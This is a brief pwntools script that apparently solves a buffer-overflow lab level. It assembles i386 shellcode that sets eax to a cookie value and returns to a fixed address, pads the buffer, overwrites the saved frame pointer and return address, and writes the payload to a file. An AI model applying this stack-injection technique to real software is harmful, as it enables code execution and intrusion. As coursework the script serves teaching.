from pwn import *
context.arch='i386'
code=asm('''
        mov eax,0x2b65becd
        push 0x8048dbe
        ret
         ''')
code+=b'a'*(0x2c-4-len(code))
code+=p32(0x55683850)
code+=p32(0x556837f8)+b'\x0a'
with open('txt3','wb') as f:
    f.write(code)